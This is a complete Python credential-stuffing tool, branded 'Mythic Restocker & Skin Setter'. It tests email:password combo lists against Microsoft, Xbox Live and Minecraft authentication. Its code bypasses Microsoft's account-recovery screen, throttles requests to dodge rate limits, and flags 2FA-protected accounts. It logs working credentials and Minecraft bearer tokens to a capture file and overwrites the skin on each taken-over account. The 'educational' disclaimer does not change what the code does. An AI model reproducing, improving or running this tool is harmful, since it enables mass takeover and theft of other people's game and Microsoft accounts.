from __future__ import annotations
import os, sys, re, time, json, threading, warnings, datetime
from urllib.parse import urlparse, parse_qs
import concurrent.futures
import requests, urllib3
from colorama import init, Fore, Style

init(autoreset=True)
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

# ==================== ENABLE ANSI ON WINDOWS ====================
def _enable_vt_mode():
    """Enable Virtual Terminal Processing on Windows so ANSI escapes work in cmd.exe."""
    if os.name != "nt":
        return
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        h = kernel32.GetStdHandle(-11)  # STD_OUTPUT_HANDLE
        mode = ctypes.c_ulong()
        kernel32.GetConsoleMode(h, ctypes.byref(mode))
        # ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
        kernel32.SetConsoleMode(h, mode.value | 0x0004)
    except Exception:
        pass

_enable_vt_mode()

# ==================== CREDITS & BRANDING ====================
AUTHOR = "mythic_killer"
DISCORD = "15h8"
VERSION = "1.0.0 (Production)"

# ==================== DEFAULT CONFIG ====================
DEFAULT_THREADS = 5
DEFAULT_SKIN = "https://s.namemc.com/i/b50a58721968c8f3.png"
DEFAULT_VARIANT = "classic"  # 'classic' or 'slim'
TIMEOUT = 15
MAX_RETRIES = 5

# Rate limit delays (seconds) across all threads to prevent 429s
MS_RATE_DELAY = 1.2
MC_RATE_DELAY = 1.5

MS_AUTH_URL = (
    "https://login.live.com/oauth20_authorize.srf"
    "?client_id=00000000402B5328"
    "&redirect_uri=https://login.live.com/oauth20_desktop.srf"
    "&scope=service::user.auth.xboxlive.com::MBI_SSL"
    "&display=touch&response_type=token&locale=en"
)

# Set Windows Console Title if on Windows
def set_title(title: str):
    try:
        if os.name == "nt":
            import ctypes
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        else:
            sys.stdout.write(f"\x1b]2;{title}\x07")
            sys.stdout.flush()
    except Exception:
        pass

# ==================== THREAD-SAFE RATE LIMITER ====================
class RateLimiter:
    """Controls request speed across threads so Microsoft & Mojang don't throttle."""
    def __init__(self):
        self.lock = threading.Lock()
        self.last_calls = {}

    def wait(self, domain: str = "ms", delay: float = 1.2):
        with self.lock:
            now = time.time()
            last = self.last_calls.get(domain, 0.0)
            elapsed = now - last
            if elapsed < delay:
                time.sleep(delay - elapsed)
            self.last_calls[domain] = time.time()

rate_limiter = RateLimiter()

# ==================== GLOBAL STATS & LOCKS ====================
stats_lock = threading.Lock()
file_lock = threading.Lock()
stop_event = threading.Event()

stats = {
    "total": 0,
    "checked": 0,
    "hits": 0,
    "bad": 0,
    "twofa": 0,
    "valid_mail": 0,
    "skin_set": 0,
    "skin_failed": 0,
    "retries": 0,
    "errors": 0,
    "cpm": 0,
    "recent_log": "Starting checker..."
}

RUN_RESULTS_DIR = "results"
CACHED_SKIN_DATA: bytes | None = None
DISPLAY_MODE = "1"  # "1" = Live CUI, "2" = Log stream

def log_stat(key: str, count: int = 1):
    with stats_lock:
        stats[key] = stats.get(key, 0) + count

def set_recent_log(text: str):
    with stats_lock:
        stats["recent_log"] = text

# ==================== FILE HELPERS ====================
def write_result(filename: str, content: str):
    """Thread-safe append to the current run's unique timestamped folder."""
    os.makedirs(RUN_RESULTS_DIR, exist_ok=True)
    filepath = os.path.join(RUN_RESULTS_DIR, filename)
    with file_lock:
        with open(filepath, "a", encoding="utf-8") as f:
            f.write(content)

# ==================== SKIN PRE-FETCHER & CACHE ====================
def download_skin_bytes(url: str) -> bytes | None:
    """Download skin PNG bytes once into RAM (handles direct PNG and HTML viewer pages)."""
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        r = requests.get(url, headers=headers, timeout=TIMEOUT, verify=False)
        if r.status_code == 200 and len(r.content) > 0:
            ctype = r.headers.get("content-type", "").lower()
            if "image" in ctype:
                return r.content
            # Scrape direct PNG if viewer page (e.g. NameMC, ImgBB)
            if "html" in ctype or b"<html" in r.content[:300].lower():
                m = (re.search(r'<meta property="og:image" content="([^"]+)"', r.text) or
                     re.search(r'<meta name="twitter:image" content="([^"]+)"', r.text) or
                     re.search(r'https?://[^\s"\'<>]+\.png', r.text))
                if m:
                    img_url = m.group(1)
                    r2 = requests.get(img_url, headers=headers, timeout=TIMEOUT, verify=False)
                    if r2.status_code == 200 and len(r2.content) > 0:
                        return r2.content
            return r.content
    except Exception as e:
        print(Fore.RED + f"[!] Failed downloading skin: {e}")
    return None

# ==================== AUTHENTICATION & SKIN APPLIER ====================
def get_login_params(session: requests.Session):
    """Retrieve urlPost & PPFT (sFTTag) from Microsoft with stale-cookie recovery."""
    for attempt in range(MAX_RETRIES):
        rate_limiter.wait("ms", MS_RATE_DELAY)
        try:
            r = session.get(MS_AUTH_URL, timeout=TIMEOUT)
            text = r.text

            # If page is tiny (<5000 bytes), stale session -> clear cookies
            if len(text) < 5000:
                session.cookies.clear()
                log_stat("retries")
                time.sleep(1.5)
                continue

            m_tag = re.search(r'value=\\\"(.+?)\\\"', text, re.S) or re.search(r'value="(.+?)"', text, re.S)
            m_post = re.search(r'"urlPost":"(.+?)"', text, re.S) or re.search(r"urlPost:'(.+?)'", text, re.S)
            if m_tag and m_post:
                return m_post.group(1), m_tag.group(1)
        except Exception:
            pass

        log_stat("retries")
        time.sleep(1)
    return None, None

def get_ms_token(session: requests.Session, email: str, password: str, url_post: str, sft_tag: str):
    """Authenticate with Microsoft credentials; bypasses recovery cancel screens."""
    for attempt in range(MAX_RETRIES):
        rate_limiter.wait("ms", MS_RATE_DELAY)
        try:
            data = {"login": email, "loginfmt": email, "passwd": password, "PPFT": sft_tag}
            r = session.post(url_post, data=data,
                             headers={"Content-Type": "application/x-www-form-urlencoded"},
                             allow_redirects=True, timeout=TIMEOUT)

            # Success fragment
            if "#" in r.url and r.url != MS_AUTH_URL:
                tok = parse_qs(urlparse(r.url).fragment).get("access_token", [None])[0]
                if tok and tok != "None":
                    return tok

            # Recovery cancel screen bypass
            if "cancel?mkt=" in r.text or "id=\"fmHF\"" in r.text:
                try:
                    ipt_m = re.search(r'(?<="ipt" value=").+?(?=">)', r.text)
                    pprid_m = re.search(r'(?<="pprid" value=").+?(?=">)', r.text)
                    uaid_m = re.search(r'(?<="uaid" value=").+?(?=">)', r.text)
                    act_m = re.search(r'(?<=id="fmHF" action=").+?(?=" )', r.text)
                    if ipt_m and pprid_m and uaid_m and act_m:
                        fm = {'ipt': ipt_m.group(), 'pprid': pprid_m.group(), 'uaid': uaid_m.group()}
                        ret = session.post(act_m.group(), data=fm, allow_redirects=True, timeout=TIMEOUT)
                        fin_m = re.search(r'(?<="recoveryCancel":{"returnUrl":").+?(?=",)', ret.text)
                        if fin_m:
                            fin = session.get(fin_m.group(), allow_redirects=True, timeout=TIMEOUT)
                            rec_tok = parse_qs(urlparse(fin.url).fragment).get('access_token', ["None"])[0]
                            if rec_tok and rec_tok != "None":
                                return rec_tok
                except Exception:
                    pass

            # Detect 2FA
            low = r.text.lower()
            if any(k in low for k in [
                "recover?mkt", "account.live.com/identity/confirm", "email/confirm",
                "/abuse?mkt", "help us protect your account", "verify your identity",
                "we need to verify", "enter the code", "two-step verification", "security code"
            ]):
                return "2FA"

            # Detect Invalid Credentials
            if any(k in low for k in [
                "password is incorrect", "account doesn't exist", "account doesn\\'t exist",
                "sign in to your microsoft account", "too many times with an incorrect",
                "we couldn't find", "that microsoft account doesn't exist", "your account has been locked"
            ]):
                return "BAD"

        except Exception:
            pass

        log_stat("retries")
        time.sleep(1.2)
    return "BAD"

def get_xbox_token(session: requests.Session, ms_token: str):
    """Authenticate with Xbox Live."""
    for attempt in range(MAX_RETRIES):
        rate_limiter.wait("ms", 0.5)
        try:
            r = session.post(
                "https://user.auth.xboxlive.com/user/authenticate",
                json={
                    "Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": ms_token},
                    "RelyingParty": "http://auth.xboxlive.com",
                    "TokenType": "JWT"
                },
                headers={"Content-Type": "application/json", "Accept": "application/json"},
                timeout=TIMEOUT
            )
            if r.status_code == 200:
                js = r.json()
                token = js.get("Token")
                uhs = js.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs")
                if token and uhs:
                    return token, uhs
            elif r.status_code == 429:
                time.sleep(2 * (attempt + 1))
                continue
        except Exception:
            pass
        log_stat("retries")
        time.sleep(1)
    return None, None

def get_xsts_token(session: requests.Session, xbox_token: str):
    """Authorize XSTS token for Minecraft services."""
    for attempt in range(MAX_RETRIES):
        rate_limiter.wait("ms", 0.5)
        try:
            r = session.post(
                "https://xsts.auth.xboxlive.com/xsts/authorize",
                json={
                    "Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]},
                    "RelyingParty": "rp://api.minecraftservices.com/",
                    "TokenType": "JWT"
                },
                headers={"Content-Type": "application/json", "Accept": "application/json"},
                timeout=TIMEOUT
            )
            if r.status_code == 200:
                return r.json().get("Token")
            elif r.status_code == 429:
                time.sleep(2 * (attempt + 1))
                continue
        except Exception:
            pass
        log_stat("retries")
        time.sleep(1)
    return None

def get_minecraft_token(session: requests.Session, uhs: str, xsts_token: str):
    """Obtain Minecraft Bearer token with 429 backoff."""
    for attempt in range(MAX_RETRIES):
        rate_limiter.wait("mc", MC_RATE_DELAY)
        try:
            r = session.post(
                "https://api.minecraftservices.com/authentication/login_with_xbox",
                json={"identityToken": f"XBL3.0 x={uhs};{xsts_token}"},
                headers={"Content-Type": "application/json"},
                timeout=TIMEOUT
            )
            if r.status_code == 200:
                return r.json().get("access_token")
            elif r.status_code == 429:
                log_stat("retries")
                time.sleep(5 * (attempt + 1))
                continue
        except Exception:
            pass
        log_stat("retries")
        time.sleep(1)
    return None

def check_entitlements_with_retry(session: requests.Session, mc_token: str):
    """Check ownership. CRITICAL: Never treats 429 as 'no MC', retries reliably!"""
    for attempt in range(MAX_RETRIES + 1):
        rate_limiter.wait("mc", MC_RATE_DELAY)
        try:
            r = session.get(
                "https://api.minecraftservices.com/entitlements/mcstore",
                headers={"Authorization": f"Bearer {mc_token}"},
                timeout=TIMEOUT
            )
            if r.status_code == 200:
                t = r.text.lower()
                has_normal = ("game_minecraft" in t or "product_minecraft" in t)
                has_gp_ult = "product_game_pass_ultimate" in t
                has_gp_pc = ("product_game_pass_pc" in t or "product_game_pass" in t)

                if has_normal and has_gp_ult:
                    return "Full Minecraft + GP Ultimate"
                elif has_normal and has_gp_pc:
                    return "Full Minecraft + GP PC"
                elif has_normal:
                    return "Full Minecraft"
                elif has_gp_ult:
                    return "Game Pass Ultimate"
                elif has_gp_pc:
                    return "Game Pass PC"
                else:
                    return None  # Valid Microsoft, but no Minecraft purchase

            elif r.status_code == 429:
                log_stat("retries")
                time.sleep(5 * (attempt + 1))
                continue
        except Exception:
            pass
        log_stat("retries")
        time.sleep(1.5)
    return None

def get_minecraft_profile_with_retry(session: requests.Session, mc_token: str):
    """Fetch username, UUID, capes with retry on rate limit."""
    for attempt in range(MAX_RETRIES):
        rate_limiter.wait("mc", MC_RATE_DELAY)
        try:
            r = session.get(
                "https://api.minecraftservices.com/minecraft/profile",
                headers={"Authorization": f"Bearer {mc_token}"},
                timeout=TIMEOUT
            )
            if r.status_code == 200:
                d = r.json()
                return d.get("name", "N/A"), d.get("id", "N/A"), ", ".join(c.get("alias", "") for c in d.get("capes", [])) or "None", True
            elif r.status_code == 404:
                # Unset MC account (owns game, but profile hasn't been created yet)
                return "Unset MC", "N/A", "None", False
            elif r.status_code == 429:
                log_stat("retries")
                time.sleep(3 * (attempt + 1))
                continue
        except Exception:
            pass
        log_stat("retries")
        time.sleep(1)
    return "Unknown", "N/A", "None", False

def set_minecraft_skin(session: requests.Session, token: str, variant: str, skin_url: str) -> bool:
    """Set skin using multipart file upload (primary) or direct URL (fallback)."""
    for attempt in range(MAX_RETRIES):
        rate_limiter.wait("mc", MC_RATE_DELAY)
        try:
            if CACHED_SKIN_DATA:
                r = session.post(
                    "https://api.minecraftservices.com/minecraft/profile/skins",
                    files={"file": ("skin.png", CACHED_SKIN_DATA, "image/png")},
                    data={"variant": variant},
                    headers={"Authorization": f"Bearer {token}"},
                    timeout=TIMEOUT
                )
            else:
                r = session.post(
                    "https://api.minecraftservices.com/minecraft/profile/skins",
                    json={"url": skin_url, "variant": variant},
                    headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
                    timeout=TIMEOUT
                )

            if r.status_code in (200, 204):
                return True
            elif r.status_code == 429:
                log_stat("retries")
                time.sleep(3 * (attempt + 1))
                continue
            elif r.status_code == 403 and CACHED_SKIN_DATA:
                continue
            else:
                return False
        except Exception:
            time.sleep(1)
        log_stat("retries")
    return False

# ==================== MAIN ACCOUNT PROCESSOR ====================
def check_account(email: str, password: str, variant: str, skin_url: str):
    """Processes one combo completely from Microsoft Auth through Skin Setting."""
    if stop_event.is_set():
        return

    combo_str = f"{email}:{password}"
    session = requests.Session()
    session.verify = False

    try:
        # Step 1: Microsoft Login Parameters
        url_post, sft_tag = get_login_params(session)
        if not url_post or not sft_tag:
            log_stat("bad")
            log_stat("checked")
            msg = f"[-] BAD (Login Error): {combo_str}"
            set_recent_log(msg)
            if DISPLAY_MODE == "2": print(Fore.RED + msg)
            write_result("Bad.txt", f"{combo_str}\n")
            return

        # Step 2: Microsoft Credential Auth
        ms_token = get_ms_token(session, email, password, url_post, sft_tag)
        if ms_token == "2FA":
            log_stat("twofa")
            log_stat("checked")
            msg = f"[*] 2FA: {combo_str}"
            set_recent_log(msg)
            if DISPLAY_MODE == "2": print(Fore.MAGENTA + msg)
            write_result("2fa.txt", f"{combo_str}\n")
            return
        elif ms_token == "BAD" or not ms_token:
            log_stat("bad")
            log_stat("checked")
            msg = f"[-] BAD: {combo_str}"
            set_recent_log(msg)
            if DISPLAY_MODE == "2": print(Fore.RED + msg)
            write_result("Bad.txt", f"{combo_str}\n")
            return

        # Step 3: Xbox Live Authentication
        xbox_token, uhs = get_xbox_token(session, ms_token)
        if not xbox_token or not uhs:
            log_stat("bad")
            log_stat("checked")
            msg = f"[-] BAD (Xbox Failed): {combo_str}"
            set_recent_log(msg)
            if DISPLAY_MODE == "2": print(Fore.RED + msg)
            write_result("Bad.txt", f"{combo_str}\n")
            return

        # Step 4: XSTS Authorization
        xsts_token = get_xsts_token(session, xbox_token)
        if not xsts_token:
            log_stat("bad")
            log_stat("checked")
            msg = f"[-] BAD (XSTS Failed): {combo_str}"
            set_recent_log(msg)
            if DISPLAY_MODE == "2": print(Fore.RED + msg)
            write_result("Bad.txt", f"{combo_str}\n")
            return

        # Step 5: Minecraft Token
        mc_token = get_minecraft_token(session, uhs, xsts_token)
        if not mc_token:
            log_stat("bad")
            log_stat("checked")
            msg = f"[-] BAD (MC Token Failed): {combo_str}"
            set_recent_log(msg)
            if DISPLAY_MODE == "2": print(Fore.RED + msg)
            write_result("Bad.txt", f"{combo_str}\n")
            return

        # Step 6: Ownership Check with 429 Retries
        ownership_type = check_entitlements_with_retry(session, mc_token)
        if not ownership_type:
            log_stat("valid_mail")
            log_stat("checked")
            msg = f"[*] VALID MAIL (No MC): {combo_str}"
            set_recent_log(msg)
            if DISPLAY_MODE == "2": print(Fore.YELLOW + msg)
            write_result("Valid_Mail.txt", f"{combo_str}\n")
            return

        # Step 7: Profile Fetch & Skin Setting
        name, uuid, capes, has_profile = get_minecraft_profile_with_retry(session, mc_token)

        skin_applied = False
        if has_profile and name not in ("Unset MC", "Unknown", "N/A"):
            skin_applied = set_minecraft_skin(session, mc_token, variant, skin_url)

        log_stat("hits")
        log_stat("checked")
        if skin_applied:
            log_stat("skin_set")
        else:
            log_stat("skin_failed")

        skin_tag = " [SKIN SET ✓]" if skin_applied else " [SKIN FAILED]"
        msg = f"[+] HIT: {combo_str} | {ownership_type} | Name: {name}{skin_tag}"
        set_recent_log(msg)

        if DISPLAY_MODE == "2":
            color = Fore.GREEN if skin_applied else Fore.LIGHTGREEN_EX
            print(color + msg)

        write_result("Hits.txt", f"{combo_str}\n")
        capture_entry = (
            f"Email: {email}\n"
            f"Password: {password}\n"
            f"Username: {name}\n"
            f"Account Type: {ownership_type}\n"
            f"UUID: {uuid}\n"
            f"Capes: {capes}\n"
            f"Skin Set: {'True' if skin_applied else 'False'}\n"
            f"Token: {mc_token}\n"
            f"{'=' * 40}\n"
        )
        write_result("Capture.txt", capture_entry)

    except Exception as e:
        log_stat("errors")
        log_stat("checked")
        msg = f"[!] ERROR: {combo_str} ({str(e)[:40]})"
        set_recent_log(msg)
        if DISPLAY_MODE == "2": print(Fore.RED + msg)
        write_result("Errors.txt", f"{combo_str} | Error: {e}\n")
    finally:
        session.close()

# ==================== LIVE CUI DISPLAY THREAD ====================
# Width to pad each line so old characters are overwritten cleanly
_PAD = 75

def _line(text: str) -> str:
    """Pad a line to fixed width so old content is overwritten without flicker."""
    # Strip ANSI codes to get visible length
    visible = re.sub(r'\033\[[0-9;]*m', '', text)
    padding = max(0, _PAD - len(visible))
    return text + " " * padding

def live_cui_worker(start_time: float):
    """Updates the live console dashboard smoothly every 0.4s.

    Uses \\033[H (cursor home) WITHOUT \\033[J (clear screen) to avoid
    flicker on Windows terminals.
    """
    # Clear screen once at start, then only reposition cursor
    sys.stdout.write("\033[2J\033[H")
    sys.stdout.flush()

    while not stop_event.is_set():
        try:
            with stats_lock:
                total = stats["total"]
                checked = stats["checked"]
                hits = stats["hits"]
                bad = stats["bad"]
                twofa = stats["twofa"]
                vm = stats["valid_mail"]
                skin_set = stats["skin_set"]
                skin_failed = stats["skin_failed"]
                retries = stats["retries"]
                errors = stats["errors"]
                recent = stats["recent_log"]

            # Calculate CPM (Checks Per Minute)
            elapsed = time.time() - start_time
            cpm = int((checked / elapsed) * 60) if elapsed > 1 else 0

            # Update Window Title
            set_title(
                f"Mythic Skin Setter | Checked: {checked}/{total} | Hits: {hits} | "
                f"Skins: {skin_set}/{hits if hits > 0 else 0} | Bad: {bad} | 2FA: {twofa} | Retries: {retries} | CPM: {cpm}"
            )

            if DISPLAY_MODE == "1":
                # Progress bar
                pct = (checked / total) * 100 if total > 0 else 0
                pct = min(100.0, pct)
                filled = int(pct // 5)
                bar = "█" * filled + "░" * (20 - filled)

                # Truncate recent log to fit
                recent_trunc = recent[:65]

                # Build each line, padded to fixed width to overwrite stale text
                lines = [
                    f"{Fore.CYAN}╔═══════════════════════════════════════════════════════════════╗",
                    f"{Fore.CYAN}║{Fore.GREEN}{Style.BRIGHT}            MYTHIC RESTOCKER & SKIN SETTER                     {Fore.CYAN}║",
                    f"{Fore.CYAN}║{Fore.LIGHTBLACK_EX}          by {AUTHOR}  •  Discord: {DISCORD}                 {Fore.CYAN}║",
                    f"{Fore.CYAN}╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}",
                    "",
                    f"  {Fore.WHITE}Progress    : {Fore.CYAN}[{bar}] {pct:.1f}% ({checked}/{total})",
                    f"  {Fore.WHITE}Speed       : {Fore.YELLOW}{cpm} checks/min",
                    f"  {Fore.WHITE}Elapsed     : {Fore.LIGHTBLUE_EX}{int(elapsed // 60)}m {int(elapsed % 60)}s",
                    f"  {Fore.LIGHTBLACK_EX}─────────────────────────────────────────────────────────────{Style.RESET_ALL}",
                    f"  {Fore.GREEN}Hits        : {Style.BRIGHT}{hits}",
                    f"  {Fore.CYAN}Skins Set   : {Style.BRIGHT}{skin_set}/{hits if hits > 0 else 0} {Fore.LIGHTBLACK_EX}(Failed: {skin_failed})",
                    f"  {Fore.RED}Bad         : {bad}",
                    f"  {Fore.MAGENTA}2FA         : {twofa}",
                    f"  {Fore.LIGHTMAGENTA_EX}Valid Mail  : {vm}",
                    f"  {Fore.YELLOW}Retries     : {retries}",
                    f"  {Fore.LIGHTRED_EX}Errors      : {errors}",
                    f"  {Fore.LIGHTBLACK_EX}─────────────────────────────────────────────────────────────{Style.RESET_ALL}",
                    f"  {Fore.WHITE}Last Event  : {Fore.LIGHTBLACK_EX}{recent_trunc}",
                    f"  {Fore.LIGHTBLACK_EX}─────────────────────────────────────────────────────────────{Style.RESET_ALL}",
                    f"  {Fore.LIGHTBLACK_EX}Results saved in: {RUN_RESULTS_DIR}/",
                    "",  # blank line at the end
                ]

                # Move cursor to top-left WITHOUT clearing the screen
                output = "\033[H" + "\n".join(_line(l) for l in lines) + "\n"
                sys.stdout.write(output)
                sys.stdout.flush()

            time.sleep(0.4)
        except Exception:
            time.sleep(0.5)

# ==================== COMBO SELECTOR & DEDUPLICATION ====================
def select_combo_file() -> str | None:
    """Finds available .txt files or lets user browse/enter custom file path."""
    txt_files = [f for f in os.listdir(".") if f.lower().endswith(".txt") and os.path.isfile(f)]

    print(Fore.CYAN + "Combo File Selection:")
    print(Fore.LIGHTBLACK_EX + "─────────────────────────────────────────────────────────────")

    for i, file in enumerate(txt_files, 1):
        try:
            with open(file, "r", encoding="utf-8", errors="ignore") as fh:
                cnt = sum(1 for line in fh if ":" in line.strip() and not line.strip().startswith("#"))
        except Exception:
            cnt = "?"
        print(f"  [{Fore.GREEN}{i}{Fore.RESET}] {file:<30} {Fore.YELLOW}({cnt} combos){Fore.RESET}")

    print(f"  [{Fore.CYAN}B{Fore.RESET}] Browse via Windows File Dialog (GUI)")
    print(f"  [{Fore.CYAN}C{Fore.RESET}] Enter custom path manually")
    print(Fore.LIGHTBLACK_EX + "─────────────────────────────────────────────────────────────")

    # If combos.txt exists, default to it
    has_default = "combos.txt" in [f.lower() for f in txt_files]
    prompt = Fore.CYAN + (f"Select [Press ENTER for combos.txt]: " if has_default else "Select number or [B/C]: ") + Style.RESET_ALL

    while True:
        try:
            choice = input(prompt).strip()
            if not choice and has_default:
                return next(f for f in txt_files if f.lower() == "combos.txt")

            if choice.lower() == "b":
                try:
                    import tkinter as tk
                    from tkinter import filedialog
                    root = tk.Tk()
                    root.withdraw()
                    root.attributes("-topmost", True)
                    selected = filedialog.askopenfilename(
                        title="Select Combo File",
                        filetypes=[("Text Files (*.txt)", "*.txt"), ("All Files (*.*)", "*.*")]
                    )
                    root.destroy()
                    if selected and os.path.isfile(selected):
                        return selected
                    print(Fore.RED + "[!] No file selected in dialog, try again.")
                except Exception as e:
                    print(Fore.RED + f"[!] GUI file dialog failed: {e}. Enter path manually.")

            elif choice.lower() == "c":
                path = input(Fore.CYAN + "Enter full/relative file path: " + Style.RESET_ALL).strip().strip('"').strip("'")
                if os.path.isfile(path):
                    return path
                print(Fore.RED + f"[!] File not found: {path}")

            elif choice.isdigit():
                idx = int(choice)
                if 1 <= idx <= len(txt_files):
                    return txt_files[idx - 1]
                print(Fore.RED + "Invalid number selection.")
            elif os.path.isfile(choice):
                return choice
            else:
                print(Fore.RED + "Invalid choice. Please select from the menu.")
        except (KeyboardInterrupt, EOFError):
            return None

def load_and_dedupe_combos(filepath: str) -> list[tuple[str, str]]:
    """Loads combos and removes duplicate lines case-insensitively."""
    combos = []
    seen = set()
    raw_count = 0

    with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            raw = line.strip()
            if not raw or raw.startswith("#") or ":" not in raw:
                continue
            raw_count += 1
            email, password = raw.split(":", 1)
            email, password = email.strip(), password.strip()
            if not email or not password:
                continue

            # Case-insensitive email deduplication
            key = f"{email.lower()}:{password}"
            if key in seen:
                continue
            seen.add(key)
            combos.append((email, password))

    dupes_removed = raw_count - len(combos)
    print(Fore.GREEN + f"[+] Loaded {len(combos)} unique combos " +
          (Fore.YELLOW + f"({dupes_removed} duplicate lines removed)" if dupes_removed > 0 else ""))
    return combos

# ==================== STARTUP DISCLAIMER ====================
def show_disclaimer():
    """Startup legal & educational purpose warning."""
    set_title("Mythic Skin Setter | Disclaimer")
    print(Fore.YELLOW + Style.BRIGHT + """
╔═══════════════════════════════════════════════════════════════╗
║                      ⚠️ LEGAL DISCLAIMER ⚠️                     ║
╚═══════════════════════════════════════════════════════════════╝
""" + Fore.WHITE + """  • This software is developed for EDUCATIONAL & RESEARCH PURPOSES ONLY.
  • The developer (""" + Fore.CYAN + f"{AUTHOR}" + Fore.WHITE + """) accepts ZERO responsibility for any misuse,
    damages, or violations of Terms of Service caused by using this program.
  • You are solely responsible for ensuring you have full authorization
    to test the credentials and accounts you process.
  • Use completely at your own risk.
""" + Fore.LIGHTBLACK_EX + "─────────────────────────────────────────────────────────────")
    try:
        input(Fore.CYAN + "Press ENTER to acknowledge and accept terms (Ctrl+C to exit)..." + Style.RESET_ALL)
    except (KeyboardInterrupt, EOFError):
        print(Fore.RED + "\n[!] User declined terms. Exiting.")
        sys.exit(0)

# ==================== MAIN ENTRY POINT ====================
def main():
    global CACHED_SKIN_DATA, RUN_RESULTS_DIR, DISPLAY_MODE

    os.system("cls" if os.name == "nt" else "clear")
    show_disclaimer()

    os.system("cls" if os.name == "nt" else "clear")
    print(Fore.CYAN + Style.BRIGHT + f"""
╔═══════════════════════════════════════════════════════════════╗
║{Fore.GREEN}           MYTHIC MINECRAFT RESTOCKER & SKIN SETTER            {Fore.CYAN}║
║{Fore.WHITE}              by {Fore.YELLOW}{AUTHOR}{Fore.WHITE}  |  Discord: {Fore.YELLOW}{DISCORD}{Fore.CYAN}               ║
╚═══════════════════════════════════════════════════════════════╝
""")

    # 1. Combo Selection
    combo_file = select_combo_file()
    if not combo_file:
        print(Fore.RED + "[!] No combo file selected. Exiting.")
        return

    combos = load_and_dedupe_combos(combo_file)
    if not combos:
        print(Fore.RED + "[!] No valid combos found in file (format must be email:password).")
        return

    # Generate Unique Timestamped Results Directory
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    combo_basename = os.path.splitext(os.path.basename(combo_file))[0]
    RUN_RESULTS_DIR = os.path.join("results", f"{timestamp}_{combo_basename}")
    os.makedirs(RUN_RESULTS_DIR, exist_ok=True)

    # 2. Configure Threads (Default 5)
    thread_input = input(Fore.CYAN + f"\nThreads [Press ENTER for default {DEFAULT_THREADS}]: " + Style.RESET_ALL).strip()
    threads = int(thread_input) if thread_input.isdigit() and int(thread_input) > 0 else DEFAULT_THREADS

    # 3. Configure Skin URL & Variant
    skin_input = input(Fore.CYAN + f"Skin URL [Press ENTER for default]: " + Style.RESET_ALL).strip()
    skin_url = skin_input if skin_input.startswith("http") else DEFAULT_SKIN

    variant_input = input(Fore.CYAN + f"Skin Variant [1: classic (default), 2: slim]: " + Style.RESET_ALL).strip()
    variant = "slim" if variant_input == "2" else DEFAULT_VARIANT

    # 4. Display Mode Selection
    print(Fore.CYAN + f"\nDisplay Mode:")
    print(f"  [{Fore.GREEN}1{Fore.RESET}] Live CUI Dashboard (Clean, in-place refresh)")
    print(f"  [{Fore.GREEN}2{Fore.RESET}] Log Stream (Scrolling lines for each account)")
    mode_input = input(Fore.CYAN + "Select mode [Press ENTER for Live CUI]: " + Style.RESET_ALL).strip()
    DISPLAY_MODE = "2" if mode_input == "2" else "1"

    print(Fore.LIGHTBLUE_EX + f"\n[+] Pre-fetching skin image...")
    CACHED_SKIN_DATA = download_skin_bytes(skin_url)
    if CACHED_SKIN_DATA:
        print(Fore.GREEN + f"[+] Skin PNG cached in RAM ({len(CACHED_SKIN_DATA)} bytes) for all worker threads!")
    else:
        print(Fore.YELLOW + f"[!] Direct image pre-fetch failed; will use URL fallback.")

    stats["total"] = len(combos)

    print(Fore.CYAN + f"\n[+] Run Configuration:")
    print(f"    • Developer    : {AUTHOR} (Discord: {DISCORD})")
    print(f"    • Combos       : {len(combos)}")
    print(f"    • Threads      : {threads}")
    print(f"    • Rate Limiter : ON ({MS_RATE_DELAY}s MS / {MC_RATE_DELAY}s MC)")
    print(f"    • 429 Retries  : ON (Backoff on throttle)")
    print(f"    • Skin URL     : {skin_url}")
    print(f"    • Variant      : {variant}")
    print(f"    • Results Path : {os.path.abspath(RUN_RESULTS_DIR)}")
    print(Fore.GREEN + f"\n[+] Initializing threads...\n")
    time.sleep(1.5)

    start_time = time.time()

    # Start Background CUI worker
    cui_thread = threading.Thread(target=live_cui_worker, args=(start_time,), daemon=True)
    cui_thread.start()

    # Multi-threaded execution
    try:
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [
                executor.submit(check_account, email, pwd, variant, skin_url)
                for email, pwd in combos
            ]
            concurrent.futures.wait(futures)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Stopping checker safely (Ctrl+C pressed)...")
        stop_event.set()

    stop_event.set()
    time.sleep(0.5)

    elapsed = round(time.time() - start_time, 2)

    # Clear screen cleanly before final summary
    os.system("cls" if os.name == "nt" else "clear")

    # Final Statistics Summary Screen
    print("\n" + "=" * 65)
    print(Fore.GREEN + Style.BRIGHT + f"                    CHECKING COMPLETE")
    print(Fore.LIGHTBLACK_EX + f"              by {AUTHOR}  •  Discord: {DISCORD}")
    print("=" * 65)
    print(f"  • Total Combos : {stats['total']}")
    print(f"  • Checked      : {stats['checked']}")
    print(Fore.GREEN + f"  • Hits         : {stats['hits']}")
    print(Fore.CYAN  + f"  • Skins Set    : {stats['skin_set']}/{stats['hits'] if stats['hits'] > 0 else 0}")
    print(Fore.RED   + f"  • Skin Failed  : {stats['skin_failed']}")
    print(Fore.LIGHTMAGENTA_EX + f"  • Valid Mail   : {stats['valid_mail']}")
    print(Fore.RED   + f"  • Bad          : {stats['bad']}")
    print(Fore.MAGENTA+f"  • 2FA          : {stats['twofa']}")
    print(Fore.YELLOW+ f"  • Retries Done : {stats['retries']}")
    print(Fore.LIGHTRED_EX + f"  • Errors       : {stats['errors']}")
    print(f"  • Elapsed Time : {int(elapsed // 60)}m {int(elapsed % 60)}s ({elapsed}s)")
    print("=" * 65)
    print(Fore.CYAN + f"  • Results Folder : {os.path.abspath(RUN_RESULTS_DIR)}")
    print("=" * 65)

    input(Fore.LIGHTGREEN_EX + "\nPress ENTER to exit..." + Style.RESET_ALL)

